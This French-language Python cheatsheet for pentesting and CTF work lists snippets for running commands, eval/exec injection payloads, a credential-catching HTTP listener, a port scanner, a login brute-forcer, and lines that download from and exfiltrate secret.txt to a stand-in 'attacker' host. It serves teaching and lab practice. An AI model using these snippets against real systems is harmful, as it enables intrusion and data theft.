# 🐍 Python Cheatsheet – Pentesting & CTF Edition

## 🔧 Lancement de serveurs

<!--
Notes: Les modules python sont d'abord appele la ou le script est execute 
L'ordre de recherche de sys.path en Python :

Le répertoire du script lui-même (exemple: ici /opt/backup_tool/)
Les variables d'environnement PYTHONPATHJ
Les dossiers standards (/usr/lib/python3/...)

Check:
	python3 --version
	python3 -c "import sys; print(sys.path)"
-->

```
python3 -m http.server 8000  
```
> Démarre un serveur HTTP local sur le port 8000 (exfiltration, transfert de fichiers).  

```
python3 -m smtpd -c DebuggingServer -n localhost:1025  
```
> Lance un serveur SMTP local (utile en test d’email spoofing).

---

## 💉 Commandes utiles pour l’exploitation

```
import os  
os.system("id")  
```
> Exécute une commande système.

```
import subprocess  
subprocess.call(["ls", "-la"])  
```
> Exécution plus fine de commandes.

```
eval("__import__('os').system('id')")  
```
> Exemple d’injection dans un `eval()` vulnérable.

```
exec("__import__('os').system('whoami')")  
```
> Variante d’exécution arbitraire via `exec()`.

```
pickle.loads(payload)  
```
> Chargement de données malveillantes via Pickle (attention vulnérable si non contrôlé).

---

## 🐍 Scripts utiles en post-exploitation

# Serveur simple pour voler des creds (ex: LFI)
```
from http.server import BaseHTTPRequestHandler, HTTPServer  
class Handler(BaseHTTPRequestHandler):  
  def do_GET(self):  
    print(self.path)  
    self.send_response(200)  
    self.end_headers()  
    self.wfile.write(b"OK")  

HTTPServer(("0.0.0.0",8000), Handler).serve_forever()  
```

> Enregistre tout ce qui est demandé, très utile en LFI.

---

## 🔍 Analyse et bruteforce

# Scanner de ports simple
```
import socket  
for port in range(1,1025):  
  s = socket.socket()  
  s.settimeout(0.5)  
  result = s.connect_ex(("127.0.0.1", port))  
  if result == 0:  
    print(f"Port {port} ouvert")  
  s.close()  
```

# Brute force simple
```
import requests  
for pwd in ["admin", "1234", "password"]:  
  r = requests.post("http://target/login", data={"user":"admin", "pass":pwd})  
  if "Welcome" in r.text:  
    print("Mot de passe trouvé :", pwd)  
```

---

## 📁 Téléchargement de fichiers

# Télécharger un fichier via HTTP
```
import urllib.request  
urllib.request.urlretrieve("http://attacker/file.sh", "file.sh")  
```

# Exfiltration d’un fichier
```
import requests  
f = open("secret.txt", "rb")  
r = requests.post("http://attacker/upload", files={"file": f})  
```

---

## 📦 Librairies à connaître

- requests : Requêtes HTTP (bruteforce, SSRF, etc.)
- urllib : Requêtes simples (moins puissant que requests)
- os / subprocess : Exécution de commandes
- socket : Réseaux (recon, shells, serveurs)
- base64 : Encodage/décodage
- hashlib : Génération de hash (crack)
- json : Lecture de fichiers config/API

---

## 🔐 Hash / Encodage

```
import base64  
base64.b64encode(b"admin")  
```
> Encode une chaîne en Base64.  

```
import hashlib  
hashlib.md5(b"admin").hexdigest()  
```
> Hash MD5 d'une chaîne (utile en cracking).  

---

## 🧠 Astuces

```
__import__('os').system('whoami')  
```
> Utile si on peut injecter du code Python dans une appli (SSTI, etc.).

```
type(variable), dir(variable), help(variable)  
```
> Très pratique en RE ou debug dans un environnement inconnu.

---

## 🚨 Pour éviter les vulnérabilités

- Ne jamais utiliser `eval()` ou `exec()` avec des données non contrôlées.
- Attention à `pickle.loads()` — peut exécuter du code arbitraire.
- Toujours valider les entrées utilisateur.
